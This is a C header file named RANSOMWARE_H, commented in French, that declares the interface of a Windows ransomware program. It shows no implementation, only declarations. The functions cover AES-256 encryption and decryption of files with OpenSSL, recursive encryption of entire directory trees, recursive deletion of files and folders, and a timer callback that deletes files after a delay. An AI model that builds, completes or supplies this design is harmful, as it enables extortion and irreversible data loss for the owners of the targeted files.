#ifndef RANSOMWARE_H
#define RANSOMWARE_H

#include <openssl/evp.h>
#include <openssl/aes.h>
#include <stdio.h>
#include <windows.h> 
  
#define BUFFER_SIZE 4096 
#define KEY_SIZE 32 // Taille de la clé AES (256 bits)
#define IV_SIZE 16  // Taille du vecteur d'initialisation (IV)
#define AES_BLOCK_SIZE 16 // Tampon de 16 octets pour s'assurer qu'il y a suffisamment d'espace pour les données traitées par AES

/**
 * Fonction pour chiffrer un fichier.
 *
 * @param input_path Chemin du fichier à chiffrer.
 * @param key Clé de chiffrement (doit être de taille KEY_SIZE).
 * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
 * @return 0 en cas de succès, -1 en cas d'erreur, -2 si le fichier est déjà encrypter
 */
int encrypt_file(const char *input_path, unsigned char *key, unsigned char *iv);

/**
 * Fonction pour déchiffrer un fichier.
 *
 * @param input_path Chemin du fichier à déchiffrer.
 * @param key Clé de déchiffrement (doit être de taille KEY_SIZE).
 * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
 * @return 0 en cas de succès, -1 en cas d'erreur, -2 si la clé ou l'IV est incorrect, -3 si le fichier n'est pas chiffré.
 */
int decrypt_file(const char *input_path, unsigned char *key, unsigned char *iv);

/**
 * Fonction pour lire et chiffrer/déchiffrer un répertoire et ses sous-répertoires.
 *
 * @param dir_path Chemin du répertoire à parcourir.
 * @param mode Mode d'opération : 0 pour chiffrer, 1 pour déchiffrer.
 * @param key Clé de chiffrement/déchiffrement (doit être de taille KEY_SIZE).
 * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
 * @return Si déchiffrement, retourne 0 si au moins un fichier a été déchiffré avec succès, -2 sinon.
           Si chiffrement, retourne 0 quoi qu'il arrive
 */
int read_and_crypt_directory(const char *dir_path, int mode, unsigned char *key, unsigned char *iv);

/**
 * Fonction auxiliaire pour vérifier si un fichier est régulier.
 *
 * @param path Chemin du fichier à vérifier.
 * @return 1 si le fichier est régulier, 0 sinon.
 */
int is_regular_file(const char *path);

/**
 * Fonction auxiliaire pour vérifier si un chemin correspond à un répertoire.
 *
 * @param path Chemin à vérifier.
 * @return 1 si le chemin est un répertoire, 0 sinon.
 */
int is_directory(const char *path);

/**
 * Fonction pour construire le chemin d'accès complet d'un fichier.
 *
 * @param directory Chemin du répertoire parent.
 * @param file Nom du fichier.
 * @param full_path Buffer pour stocker le chemin complet.
 * @param size Taille du buffer full_path.
 */
void construct_path(const char *directory, const char *file, char *full_path, size_t size);

/**
 * @brief Supprime un fichier ou un répertoire spécifié.
 * 
 * Cette fonction vérifie si le chemin donné représente un fichier ou un répertoire.
 * - Si c'est un fichier, il est supprimé.
 * - Si c'est un répertoire, la fonction supprime d'abord tous les fichiers et sous-répertoires à l'intérieur du répertoire de manière récursive, puis supprime le répertoire vide.
 * 
 * @param path Le chemin du fichier ou répertoire à supprimer. Ce chemin doit être un chemin absolu valide.
 * 
 * @note Si un fichier ou un répertoire est verrouillé ou en cours d'utilisation par un autre processus, la suppression échouera.
 */
void removeFileOrDirectory(const char *path);


/**
 * Fonction de rappel (callback) appelée lorsque le timer atteint son délai.
 * Cette fonction tente de supprimer le fichier spécifié.
 *
 * @param lpArg Pointeur vers le chemin du fichier à supprimer.
 * @param dwTimerLowValue Valeur basse du timer.
 * @param dwTimerHighValue Valeur haute du timer.
 */
void CALLBACK TimerCallback(LPVOID lpArg, DWORD dwTimerLowValue, DWORD dwTimerHighValue);


/**
 * Fonction pour planifier la suppression d'un fichier après un délai spécifié.
 * Un timer Windows est utilisé pour appeler la fonction de suppression après le délai.
 *
 * @param file_path Chemin du fichier à supprimer.
 * @param wait_time_seconds Délai en secondes avant que le fichier soit supprimé.
 */
void scheduleFileDeletion(const char *file_path, int wait_time_seconds);

#endif // RANSOMWARE_H
